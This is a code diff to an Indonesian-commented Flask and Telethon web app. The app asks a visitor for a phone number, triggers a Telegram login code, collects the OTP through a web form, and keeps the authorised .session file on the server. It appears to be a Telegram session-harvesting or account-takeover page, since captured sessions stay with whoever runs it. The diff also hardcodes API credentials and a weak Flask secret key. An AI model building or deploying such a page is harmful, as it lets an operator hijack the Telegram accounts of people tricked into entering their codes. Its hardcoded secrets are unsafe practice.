@@ -1,7 +1,9 @@
 import asyncio
 import os
 import logging
-from flask import Flask, render_template, request, redirect, url_for, flash
+from threading import Lock
+from datetime import timedelta
+from flask import Flask, render_template, request, redirect, url_for, flash, session
 from telethon import TelegramClient
 import nest_asyncio
 
@@ -22,22 +24,51 @@ nest_asyncio.apply()
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-# Masukkan API_ID dan API_HASH Anda langsung di sini
+# Konfigurasi
 API_ID = '20115110'
 API_HASH = '192c9900730edbd7e03fe772e3f8810d'
-
-# Secret key untuk session Flask
 SECRET_KEY = 'ManusiaHebat'
 
-# Pastikan folder untuk sesi ada
-SESSION_FOLDER = "Session"
+# Buat absolute path untuk folder Session
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+SESSION_FOLDER = os.path.join(BASE_DIR, "Session")
 os.makedirs(SESSION_FOLDER, exist_ok=True)
 
+# Thread-safe dictionary implementation
+class ThreadSafeDict:
+    def __init__(self):
+        self._dict = {}
+        self._lock = Lock()
+    
+    def __getitem__(self, key):
+        with self._lock:
+            return self._dict[key]
+    
+    def __setitem__(self, key, value):
+        with self._lock:
+            self._dict[key] = value
+    
+    def __delitem__(self, key):
+        with self._lock:
+            del self._dict[key]
+    
+    def __contains__(self, key):
+        with self._lock:
+            return key in self._dict
+            
+    def keys(self):
+        with self._lock:
+            return list(self._dict.keys())
+    
+    def items(self):
+        with self._lock:
+            return list(self._dict.items())
+
+# Inisialisasi Flask dan clients dictionary
 app = Flask(__name__)
 app.secret_key = SECRET_KEY
-
-# Dictionary untuk menyimpan client
-clients = {}
+app.permanent_session_lifetime = timedelta(minutes=5)
+clients = ThreadSafeDict()
 
 def run_async(coro):
     """Helper function untuk menjalankan coroutine."""
@@ -56,12 +87,31 @@ async def init_client(phone_number, session_file):
             logging.debug("Creating new client")
             client = TelegramClient(session_file, API_ID, API_HASH, loop=loop)
             await client.connect()
+            if not await client.is_connected():
+                raise Exception("Failed to connect to Telegram")
             clients[phone_number] = client
             logging.debug(f"Client created and stored in clients dictionary")
         return clients[phone_number]
     except Exception as e:
         logging.error(f"Error in init_client: {str(e)}", exc_info=True)
+        if phone_number in clients:
+            del clients[phone_number]
         raise
+
+@app.before_request
+def before_request():
+    # Clear expired sessions
+    if 'current_phone' in session:
+        phone = session['current_phone']
+        if phone not in clients:
+            session.pop('current_phone', None)
+            logging.debug(f"Cleared expired session for {phone}")
+
+@app.after_request
+def after_request(response):
+    # Log active clients after each request
+    logging.debug(f"Active clients after request: {list(clients.keys())}")
+    return response
 
 @app.route("/", methods=["GET", "POST"])
 def index():
@@ -70,25 +120,28 @@ def index():
             phone_number = request.form.get("phone_number").strip()
             logging.debug(f"Received phone number: {phone_number}")
 
-            # Tambahkan +62 jika nomor tidak dimulai dengan "+"
             if not phone_number.startswith("+"):
                 phone_number = "+62" + phone_number
             logging.debug(f"Formatted phone number: {phone_number}")
 
-            # Hapus spasi atau karakter tak diinginkan
             session_file = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '').replace(' ', '')}.session")
             logging.debug(f"Session file path: {session_file}")
+            
+            # Log file permissions if file exists
+            if os.path.exists(session_file):
+                logging.debug(f"Session file permissions: {oct(os.stat(session_file).st_mode)[-3:]}")
 
             async def send_code():
                 client = await init_client(phone_number, session_file)
-                logging.debug("Checking if user is authorized")
                 if not await client.is_user_authorized():
-                    logging.debug("Sending code request")
                     await client.send_code_request(phone_number)
-                logging.debug("Code request completed")
+                return True
 
-            logging.debug("Running send_code")
-            run_async(send_code())
+            if run_async(send_code()):
+                # Store phone number in Flask session
+                session['current_phone'] = phone_number
+                logging.debug(f"Phone number stored in session: {session['current_phone']}")
+                
             logging.debug(f"Current clients in dictionary: {list(clients.keys())}")
             return redirect(url_for("otp", phone_number=phone_number))
 
@@ -107,11 +160,25 @@ def index():
 def otp(phone_number):
     logging.debug(f"Accessing OTP route for {phone_number}")
     logging.debug(f"Available clients: {list(clients.keys())}")
+    
+    # Check Flask session
+    current_phone = session.get('current_phone')
+    logging.debug(f"Phone number from session: {current_phone}")
+    
+    if current_phone != phone_number:
+        logging.error(f"Phone number mismatch. Session: {current_phone}, URL: {phone_number}")
+        flash("Sesi tidak valid. Mulai ulang.")
+        return redirect(url_for("index"))
 
     if phone_number not in clients:
-        logging.error(f"Session not found for {phone_number}")
-        flash("Sesi tidak ditemukan. Mulai ulang.")
-        return redirect(url_for("index"))
+        try:
+            session_file = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '').replace(' ', '')}.session")
+            client = run_async(init_client(phone_number, session_file))
+            logging.debug(f"Reinitialized client for {phone_number}")
+        except Exception as e:
+            logging.error(f"Failed to reinitialize client: {str(e)}")
+            flash("Sesi tidak ditemukan. Mulai ulang.")
+            return redirect(url_for("index"))
 
     if request.method == "POST":
         try:
@@ -133,9 +200,10 @@ def otp(phone_number):
             flash(f"Tersedia {user_name} ({phone_number}).")
             logging.debug(f"Authentication successful for {user_name}")
 
-            # Bersihkan client
+            # Cleanup
             if phone_number in clients:
                 del clients[phone_number]
+                session.pop('current_phone', None)
                 logging.debug(f"Removed client for {phone_number}")
 
             return redirect(url_for("index"))
@@ -144,10 +212,15 @@ def otp(phone_number):
             logging.error(f"Error in OTP verification: {str(e)}", exc_info=True)
             flash(f"OTP salah atau terjadi kesalahan: {str(e)}")
 
-            # Bersihkan client jika terjadi error
+            # Cleanup on error
             if phone_number in clients:
-                run_async(client.disconnect())
+                try:
+                    client = clients[phone_number]
+                    run_async(client.disconnect())
+                except Exception as disconnect_error:
+                    logging.error(f"Error disconnecting client: {str(disconnect_error)}")
                 del clients[phone_number]
+                session.pop('current_phone', None)
                 logging.debug(f"Removed client for {phone_number} due to error")
             return redirect(url_for("index"))
 
